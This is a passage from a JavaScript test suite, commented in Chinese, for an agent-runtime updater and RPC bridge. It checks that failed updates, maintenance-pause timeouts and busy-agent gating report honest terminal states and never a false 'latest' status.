    check('G12. 失败后 GET：phase=failed / running=false / 带 errorCode 与脱敏 error', () =>
      (g1.phase === 'failed' && g1.running === false && g1.errorCode === 'update-failed' &&
        typeof g1.error === 'string' && !/[A-Za-z]:\\/.test(g1.error)) || JSON.stringify(g1));
    check('G13. 失败后 GET 不打公网（不会被新检查覆盖成 available）', () =>
      (state.calls.length === callsAfterFail && g1.updateAvailable === false) ||
      JSON.stringify({ calls: state.calls.length, was: callsAfterFail, g1 }));
    const g2 = await update.readStatus({});
    check('G14. 连续轮询都还是 failed（不是「一次之后又变回 available」）', () =>
      (g2.phase === 'failed' && g2.errorCode === 'update-failed' && state.calls.length === callsAfterFail) || JSON.stringify(g2));
    check('G15. 失败终态仍带版本信息（有证据时给出 current/latest）', () =>
      (g1.currentVersion === '0.99.2' && g1.latestVersion === '1.0.0') || JSON.stringify(g1));
    const forced = await update.readStatus({ force: true });
    check('G16. force 检查允许离开失败终态（用户主动要新检查）', () =>
      (forced.phase === 'available' && forced.updateAvailable === true && state.calls.length === callsAfterFail + 1) ||
      JSON.stringify({ forced, calls: state.calls.length }));
  }

  {
    /* 诊断快照也不许在更新中/终态时说「可以更新」 */
    const { update } = harness({ afterUpgrade: '1.0.0' });
    await update.readStatus({});
    await update.runUpdate({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });
    const snap = update.snapshot();
    check('G17. 终态下诊断快照同样反映 latest（不是缓存的 available）', () =>
      (snap.phase === 'latest' && snap.updateAvailable === false && snap.running === false) || JSON.stringify(snap));
  }

  /* ================= H. maintenance 超时（blocker 2） ================= */
  section('H. pauseForMaintenance：超时不算「已停止」');

  {
    const neverExit = () => {
      const child = fakeChild();
      child.kill = () => {
        child.kills++;
        /* **故意不 emit exit**：模拟 taskkill 没杀干净 / 包装进程还在 */
      };
      return child;
    };
    const children = [];
    const events = [];
    const runtime = createRuntime({ initialCwd: process.cwd() });
    const bridge = createRpcBridge({
      runtime,
      publish: (e) => events.push(e),
      piBin: 'fake-pi',
      isWin: true,
      env: {},
      spawnProcess: () => {
        const c = neverExit();
        children.push(c);
        return c;
      },
      killProcessTree: (c) => c.kill(),
      pauseTimeoutMs: 60,
      restartDelayMs: 0,
    });
    bridge.start();
    children[0].emit('spawn');
    const paused = await bridge.pauseForMaintenance('pi-update');
    check('H1. 进程没退出 → pause 失败（不是 ok:true/stopped:true）', () =>
      (paused.ok === false && paused.code === 'pause-timeout') || JSON.stringify(paused));
    check('H2. 超时后维护态被撤销（进程还活着，bridge 继续可用）', () =>
      bridge.getState().maintenance === null || JSON.stringify(bridge.getState().maintenance));
    check('H3. 超时后如实宣告 pi 仍在运行（发 ready，而不是假装停过）', () =>
      events.some((e) => e.type === 'bridge_status' && e.state === 'ready') ||
      JSON.stringify(events.filter((e) => e.type === 'bridge_status').map((e) => e.state)));
    check('H4. 超时不会产生第二个 Pi child', () => children.length === 1 || children.length);
    check('H5. 超时后 bridge 不卡维护：命令被干净拒绝，不会写到已关闭的 stdin', () => {
      try {
        bridge.send({ type: 'get_state' });
        return true;
      } catch (err) {
        return /子进程未运行|维护|重启/.test(err.message) || err.message;
      }
    });
    const againPause = await bridge.pauseForMaintenance('pi-update');
    check('H6. 超时后可以再试一次 pause（状态没卡死，仍然给出确定结论）', () =>
      (againPause.ok === false && againPause.code === 'pause-timeout') || JSON.stringify(againPause));
    /* 迟到的退出仍然按正常崩溃路径收口：重启一次，且不再有维护残留 */
    children[0].emit('exit', 1, null);
    await sleep(40);
    check('H7. 迟到的退出仍走正常重启（crash backoff 没被维护搞脏）', () =>
      (children.length === 2 && bridge.getState().maintenance === null) || JSON.stringify({ n: children.length, m: bridge.getState().maintenance }));
    runtime.setShuttingDown(true);
    bridge.stop();
  }

  {
    /* updater 侧：pause 超时必须让它一次都不跑 */
    const { update, state } = harness({ pause: { ok: false, code: 'pause-timeout' } });
    await update.readStatus({});
    const r = await update.runUpdate({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });
    check('H8. pause 超时 → updater 调用次数为 0，结果码是 pause-timeout', () =>
      (state.runArgs.length === 0 && r.ok === false && r.code === 'pause-timeout') || JSON.stringify({ calls: state.runArgs.length, r }));
    check('H9. pause 超时的提示说清「不会在它还活着时替换运行时」', () =>
      /没有退出|还活着/.test(r.error) || r.error);
    check('H10. pause 超时不 resume（不是我们停的），也不碰缓存失效', () =>
      (state.resumed === 0 && state.invalidated === 0) || JSON.stringify(state));
  }

  /* ================= I. 主会话活动与更新闸门（blocker 3） ================= */
  section('I. 活动生命周期（agent_start → agent_settled）与闸门');

  {
    const { createPiActivity } = await import('../server/pi-activity.js');
    const act = createPiActivity();
    act.noteCommandAccepted({ type: 'prompt' });
    check('I1. prompt 已被桥接受、agent_start 还没到 → 仍算忙（竞态窗口）', () =>
      Boolean(act.busy()) || JSON.stringify(act.state()));
    act.observe({ type: 'agent_start' });
    check('I2. agent_start → 忙', () => Boolean(act.busy()) || JSON.stringify(act.state()));
    act.observe({ type: 'agent_end', willRetry: true });
    check('I3. agent_end(willRetry=true) **不算结束**：仍忙（自动重试还没跑）', () =>
      Boolean(act.busy()) || JSON.stringify(act.state()));
    act.observe({ type: 'agent_start' });
    act.observe({ type: 'agent_end', willRetry: false });
    check('I4. 第二轮 run 的 agent_end（即使不重试）也仍算忙 —— 只有 settled 才算完', () =>
      Boolean(act.busy()) || JSON.stringify(act.state()));
    act.observe({ type: 'agent_settled' });
    check('I5. agent_settled → 空闲（这时才允许更新）', () => act.busy() === null || JSON.stringify(act.state()));
  }
  {
    const { createPiActivity } = await import('../server/pi-activity.js');
    const act = createPiActivity();
    act.noteCommandAccepted({ type: 'prompt' });
    act.observe({ type: 'response', command: 'prompt', success: true, data: { disposition: 'handled' } });
    check('I6. prompt 应答 disposition=handled（不会开 run）→ 撤回 pending', () =>
      act.busy() === null || JSON.stringify(act.state()));
    const act2 = createPiActivity();
    act2.noteCommandAccepted({ type: 'prompt' });
    act2.observe({ type: 'response', command: 'prompt', success: true, data: { disposition: 'queued' } });
    check('I7. disposition=queued（排队等着跑）→ 仍然忙', () => Boolean(act2.busy()) || JSON.stringify(act2.state()));
    const act3 = createPiActivity();
    act3.noteCommandAccepted({ type: 'prompt' });
    act3.observe({ type: 'response', command: 'prompt', success: true, data: { disposition: 'started' } });
    check('I8. disposition=started → 仍然忙（等 agent_settled）', () => Boolean(act3.busy()) || JSON.stringify(act3.state()));
  }
  {
    const { createPiActivity } = await import('../server/pi-activity.js');
    for (const state of ['starting', 'restarting', 'exited', 'error', 'no-project', 'maintenance']) {
      const act = createPiActivity();
      act.observe({ type: 'agent_start' });
      act.observe({ type: 'bridge_status', state });
      check(`I9. bridge ${state} → 确定收口（不允许 busy 永久挂住）`, () =>
        act.busy() === null || JSON.stringify(act.state()));
    }
    const act = createPiActivity();
    act.observe({ type: 'agent_start' });
    act.noteCommandAccepted({ type: 'new_session' });
    check('I10. new_session → 换时间线，清账', () => act.busy() === null || JSON.stringify(act.state()));
  }
  {
    /* 闸门与真实 activity 串起来：activity 说忙 → prepare 就拒绝，一次 updater 都不跑 */
    const { createPiActivity } = await import('../server/pi-activity.js');
    const act = createPiActivity();
    const { update, state } = harness({ busy: () => act.busy(), afterUpgrade: '1.0.0' });
    await update.readStatus({});
    act.noteCommandAccepted({ type: 'prompt' });
    const r = await update.runUpdate({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });
    check('I11. prompt 已提交但 agent_start 未到 → 更新被拒（busy-turn），updater 一次没跑', () =>
      (r.ok === false && r.code === 'busy-turn' && state.runArgs.length === 0 && state.paused === 0) ||
      JSON.stringify({ r, calls: state.runArgs.length }));
    act.observe({ type: 'agent_start' });
    act.observe({ type: 'agent_end', willRetry: true });
    const r2 = await update.runUpdate({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });
    check('I12. agent_end(willRetry=true) 之后更新仍被拒（自动重试还没跑完）', () =>
      (r2.ok === false && r2.code === 'busy-turn' && state.runArgs.length === 0) || JSON.stringify(r2));
    act.observe({ type: 'agent_settled' });
    const r3 = await update.runUpdate({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });
    check('I13. agent_settled 之后才放行（真的走到 updater）', () =>
      (r3.ok === true && state.runArgs.length === 1) || JSON.stringify({ r3, calls: state.runArgs.length }));
  }

  /* ================= J. 暂停失败也必须落 failed 终态 =================
   *
   * 真实缺陷的形态：`execute()` 在暂停失败时**提前 return**，绕过了终态写入，
   * 于是留下 `updateState != null && updateInflight == null && result == null`。
   * `updateStatusPayload()` 读不出「失败」，就报 `phase:'latest'` ——
   * updater 一次都没跑，界面却说「已是最新版本」。这是**假成功**，比报错危险。
   * 这一组把每条暂停失败路径的终态都钉住。 */
  section('J. 暂停失败 → failed 终态（不能报 latest）');

  const waitDone = async (update) => {
    for (let i = 0; i < 100 && update.isRunning(); i++) await sleep(5);
  };
  const updateBody = { action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' };

  /* 三条暂停失败路径共用一套断言（只换 code 与期望的 errorCode）。 */
  const pauseFailureCases = [
    { pauseCode: 'pause-timeout', expect: 'pause-timeout' },
    { pauseCode: 'pause-failed', expect: 'pause-failed' },
    { pauseCode: 'already-in-maintenance', expect: 'update-running' },
  ];
  for (const c of pauseFailureCases) {
    const { update, state } = harness({ pause: { ok: false, code: c.pauseCode } });
    const before = await update.readStatus({});
    check(`J.${c.pauseCode} 前置：更新前是 available`, () =>
      (before.phase === 'available' && before.updateAvailable === true) || JSON.stringify(before));
    const started = await update.startUpdate(updateBody);
    check(`J.${c.pauseCode} POST 被接受（accepted + phase=updating）`, () =>
      (started.ok === true && started.accepted === true && started.phase === 'updating') || JSON.stringify(started));
    await waitDone(update);
    const after = await update.readStatus({ force: false });
    check(`J.${c.pauseCode} **GET 是 failed，不是 latest**（ok:false / running:false）`, () =>
      (after.ok === false && after.phase === 'failed' && after.running === false) || JSON.stringify(after));
    check(`J.${c.pauseCode} errorCode=${c.expect} + 脱敏 error`, () =>
      (after.errorCode === c.expect && typeof after.error === 'string' && after.error.length > 0 &&
        !/[A-Za-z]:\\/.test(after.error)) || JSON.stringify(after));
    check(`J.${c.pauseCode} 保留版本上下文（0.99.2 → 1.0.0）`, () =>
      (after.currentVersion === '0.99.2' && after.latestVersion === '1.0.0') || JSON.stringify(after));
    check(`J.${c.pauseCode} updateAvailable=false（不再显示「更新到 x」）`, () =>
      (after.updateAvailable === false && after.canUpdate === false) || JSON.stringify(after));
    check(`J.${c.pauseCode} updater 一次都没跑`, () =>
      (state.paused === 1 && state.runArgs.length === 0) || JSON.stringify({ paused: state.paused, runs: state.runArgs.length }));
    check(`J.${c.pauseCode} 没暂停成功就**不 resume**（维护态不是我们的）`, () =>
      state.resumed === 0 || state.resumed);
    check(`J.${c.pauseCode} 不 invalidateCaches（一个字节都没改）`, () =>
      state.invalidated === 0 || state.invalidated);
    const st = update._internals.state();
    check(`J.${c.pauseCode} 不变量：终态存在就一定有 result`, () =>
      (!st.running && st.hasUpdateState ? st.hasResult : true) || JSON.stringify(st));
    const again = await update.readStatus({ force: false });
    check(`J.${c.pauseCode} 连续 GET 保持 failed（不会被新检查覆盖）`, () =>
      (again.phase === 'failed' && again.errorCode === c.expect) || JSON.stringify(again));
    const snap = update.snapshot();
    check(`J.${c.pauseCode} 诊断快照同样是 failed`, () =>
      (snap.phase === 'failed' && snap.running === false && snap.errorCode === c.expect) || JSON.stringify(snap));
    const forced = await update.readStatus({ force: true });
    check(`J.${c.pauseCode} force 检查才允许离开终态`, () =>
      (forced.phase === 'available' && forced.updateAvailable === true) || JSON.stringify(forced));
  }

  {
    /* 不变量本身：终态 + 没有 result（自相矛盾）必须 **fail closed**。
     * 正常路径现在产生不出这个状态（出口只有一个 finishUpdate），
     * 所以直接喂给那个纯函数，钉住「绝不报 latest」。 */
    const { update } = harness();
    const inconsistent = update._internals.updateStatusPayload({
      phase: 'failed',
      ctx: { currentVersion: '0.99.2', latestVersion: '1.0.0', verification: 'unverified' },
      result: null,
    });
    check('J11. 自相矛盾的终态（result=null）fail closed：不报 latest', () =>
      (inconsistent.phase === 'failed' && inconsistent.ok === false &&
        inconsistent.errorCode === 'state-inconsistent' && inconsistent.running === false) || JSON.stringify(inconsistent));
    check('J12. 自相矛盾时仍然给出可读的脱敏原因', () =>
      /没有留下终态结果/.test(inconsistent.error || '') || inconsistent.error);
  }

  {
    /* 每条**执行层**路径的终态都必须带 result —— 成功 / updater 失败 / 复验失败。 */
    const paths = [
      { name: '成功', opts: { afterUpgrade: '1.0.0' }, expectPhase: 'latest', expectOk: true },
      { name: 'updater 失败', opts: { runResult: { ok: false, exitCode: 1, stderr: 'boom' } }, expectPhase: 'failed', expectOk: false },
      { name: '复验失败', opts: {}, expectPhase: 'failed', expectOk: false },
    ];
    for (const p of paths) {
      const { update } = harness(p.opts);
      await update.readStatus({});
      await update.runUpdate(updateBody);
      const st = update._internals.state();
      check(`J13.${p.name}：终态有 result、phase 与 ok 一致`, () =>
        (!st.running && st.hasUpdateState && st.hasResult && st.phase === p.expectPhase &&
          update.snapshot().phase === p.expectPhase) || JSON.stringify({ st, snap: update.snapshot() }));
      const got = await update.readStatus({});
      check(`J14.${p.name}：GET 的 ok 与结果一致（不会把失败说成成功）`, () =>
        (got.ok === p.expectOk && got.phase === p.expectPhase) || JSON.stringify(got));
    }
  }

  console.log('');
  console.log(`${pass}/${pass + fail} 通过`);
  process.exitCode = fail ? 1 : 0;
})().catch((err) => {
  console.error(err);
  process.exit(1);
});
